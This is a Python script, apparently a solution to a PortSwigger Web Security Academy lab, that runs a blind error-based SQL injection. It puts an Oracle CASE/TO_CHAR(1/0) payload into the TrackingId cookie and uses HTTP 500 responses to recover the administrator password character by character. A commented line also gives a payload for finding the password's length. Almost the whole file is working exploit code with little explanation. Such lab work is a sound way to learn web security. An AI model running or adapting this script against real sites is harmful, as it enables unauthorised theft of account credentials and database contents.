import requests

# Scenario : https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-error-based-sql-injection/sql-injection/blind/lab-conditional-errors
# Based on error message getting the database details.
def check_welcome_back(url):
    try:
        password = ''
        for i in range(1,21):
            for j in range(48,58):
                # Find password size ||(SELECT CASE WHEN LENGTH(password)>20 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
                cookies_value = f"mo4g2SGGRZshICYs'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{chr(j)}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
                response = requests.get(url, cookies={'TrackingId':cookies_value})
                if response.status_code == 500:
                    password = password+chr(j)
                    break
            for j in range(97,123):
                cookies_value = f"mo4g2SGGRZshICYs'||(SELECT CASE WHEN SUBSTR(password,{i},1)='{chr(j)}' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'"
                response = requests.get(url, cookies={'TrackingId':cookies_value})
                if response.status_code == 500:
                    password = password+chr(j)
                    break
        return password

    except requests.RequestException as e:
        print(f"Request failed: {e}")
        return False

url = 'https://0a12009a045df25380ff0d9000c400c1.web-security-academy.net/filter?category=Accessories'
password = check_welcome_back(url)
print(password)
